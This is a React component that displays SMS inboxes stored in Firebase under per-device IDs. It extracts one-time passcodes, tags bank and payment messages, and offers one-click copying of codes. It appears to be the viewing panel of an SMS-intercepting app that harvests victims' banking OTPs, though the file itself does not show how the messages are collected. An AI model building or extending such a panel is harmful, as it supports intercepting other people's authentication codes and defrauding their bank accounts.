import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { ref, onValue } from 'firebase/database';
import { db } from '../firebase/config';
import './SMSDisplayPage.css';

function SMSDisplayPage() {
  const { deviceId } = useParams();
  const navigate = useNavigate();
  const [smsList, setSmsList] = useState([]);
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState('all');
  const [searchTerm, setSearchTerm] = useState('');

  useEffect(() => {
    if (deviceId) {
      loadSMS();
    }
  }, [deviceId]);

  const loadSMS = () => {
    if (!deviceId) return;

    const inboxRef = ref(db, `inbox/${deviceId}`);
    const unsubscribe = onValue(inboxRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        const smsArray = Object.entries(data).map(([key, value]) => ({
          id: key,
          ...value,
          time: Number(value.time) || 0,
          otp: extractOTP(value.message)
        }));
        smsArray.sort((a, b) => b.time - a.time);
        setSmsList(smsArray);
      } else {
        setSmsList([]);
      }
      setLoading(false);
    });

    return () => unsubscribe();
  };

  const extractOTP = (message) => {
    if (!message) return null;
    const match = message.match(/\b(\d{4,8})\b/);
    return match ? match[1] : null;
  };

  const formatTime = (timestamp) => {
    if (!timestamp) return 'N/A';
    const date = new Date(Number(timestamp));
    const now = new Date();
    const diff = now - date;
    
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
    if (diff < 604800000) return `${Math.floor(diff / 86400000)}d ago`;
    return date.toLocaleDateString('en-IN', { 
      day: '2-digit', 
      month: 'short',
      year: 'numeric'
    });
  };

  const getSenderIcon = (sender) => {
    if (!sender) return '📱';
    const senderLower = sender.toLowerCase();
    if (senderLower.includes('amazon')) return '🛒';
    if (senderLower.includes('bank') || senderLower.includes('hdfc') || senderLower.includes('sbi')) return '🏦';
    if (senderLower.includes('google') || senderLower.includes('gpay')) return '📲';
    if (senderLower.includes('zomato') || senderLower.includes('swiggy')) return '🍔';
    if (senderLower.includes('uber') || senderLower.includes('ola')) return '🚗';
    if (senderLower.includes('flipkart')) return '🛍️';
    if (senderLower.includes('paytm')) return '💳';
    return '📱';
  };

  const getCategory = (message, sender) => {
    if (!message) return 'other';
    const msg = message.toLowerCase();
    const senderLower = sender ? sender.toLowerCase() : '';
    
    if (/\b\d{4,8}\b/.test(message)) return 'otp';
    
    if (msg.includes('bank') || msg.includes('payment') || msg.includes('transaction') || 
        msg.includes('amount') || msg.includes('balance') || senderLower.includes('bank')) {
      return 'bank';
    }
    
    return 'other';
  };

  const getFilteredSMS = () => {
    let filtered = smsList;
    
    if (filter !== 'all') {
      filtered = filtered.filter(sms => 
        getCategory(sms.message, sms.sender) === filter
      );
    }
    
    if (searchTerm.trim()) {
      const term = searchTerm.toLowerCase().trim();
      filtered = filtered.filter(sms =>
        (sms.sender && sms.sender.toLowerCase().includes(term)) ||
        (sms.message && sms.message.toLowerCase().includes(term))
      );
    }
    
    return filtered;
  };

  const getFilteredCount = () => {
    const counts = {
      all: smsList.length,
      otp: smsList.filter(s => getCategory(s.message, s.sender) === 'otp').length,
      bank: smsList.filter(s => getCategory(s.message, s.sender) === 'bank').length,
      other: smsList.filter(s => getCategory(s.message, s.sender) === 'other').length
    };
    return counts;
  };

  const filteredSMS = getFilteredSMS();
  const counts = getFilteredCount();

  if (loading) {
    return (
      <div className="sms-loading">
        <div className="loading-spinner"></div>
        <p>Loading SMS...</p>
      </div>
    );
  }

  return (
    <div className="sms-display-page">
      {/* Header */}
      <div className="sms-header">
        <button className="back-btn" onClick={() => navigate(-1)}>
          ← Back
        </button>
        <h2>📩 SMS Inbox</h2>
        <span className="sms-count">{smsList.length} messages</span>
      </div>

      {/* Filters */}
      <div className="sms-filters">
        <button 
          className={`filter-btn ${filter === 'all' ? 'active' : ''}`}
          onClick={() => setFilter('all')}
        >
          All ({counts.all})
        </button>
        <button 
          className={`filter-btn otp ${filter === 'otp' ? 'active' : ''}`}
          onClick={() => setFilter('otp')}
        >
          🔑 OTP ({counts.otp})
        </button>
        <button 
          className={`filter-btn bank ${filter === 'bank' ? 'active' : ''}`}
          onClick={() => setFilter('bank')}
        >
          🏦 Bank ({counts.bank})
        </button>
        <button 
          className={`filter-btn other ${filter === 'other' ? 'active' : ''}`}
          onClick={() => setFilter('other')}
        >
          📨 Other ({counts.other})
        </button>
      </div>

      {/* Search Bar */}
      <div className="search-bar">
        <input
          type="text"
          placeholder="🔍 Search messages or senders..."
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          className="search-input"
        />
        {searchTerm && (
          <button 
            className="clear-search"
            onClick={() => setSearchTerm('')}
          >
            ✕
          </button>
        )}
      </div>

      {/* SMS List */}
      <div className="sms-list-container">
        {filteredSMS.length === 0 ? (
          <div className="sms-empty">
            <span className="empty-icon">📭</span>
            <p>No messages found</p>
            {searchTerm && <p className="empty-sub">Try clearing your search</p>}
          </div>
        ) : (
          <div className="sms-list">
            {filteredSMS.map((sms) => {
              const category = getCategory(sms.message, sms.sender);
              return (
                <div key={sms.id} className={`sms-card ${category}`}>
                  <div className="sms-card-header">
                    <div className="sender-info">
                      <span className="sender-icon">
                        {getSenderIcon(sms.sender)}
                      </span>
                      <span className="sender-name">
                        {sms.sender || 'Unknown'}
                      </span>
                      {sms.otp && (
                        <span className="otp-badge">🔑 OTP</span>
                      )}
                    </div>
                    <span className="sms-time">{formatTime(sms.time)}</span>
                  </div>
                  
                  <div className="sms-message">
                    {sms.message || 'No message content'}
                  </div>
                  
                  {sms.otp && (
                    <div className="sms-otp-container">
                      <span className="otp-label">OTP Code:</span>
                      <span className="otp-code">{sms.otp}</span>
                      <button 
                        className="copy-otp"
                        onClick={() => {
                          navigator.clipboard.writeText(sms.otp);
                          alert('OTP Copied!');
                        }}
                      >
                        📋 Copy
                      </button>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}

export default SMSDisplayPage;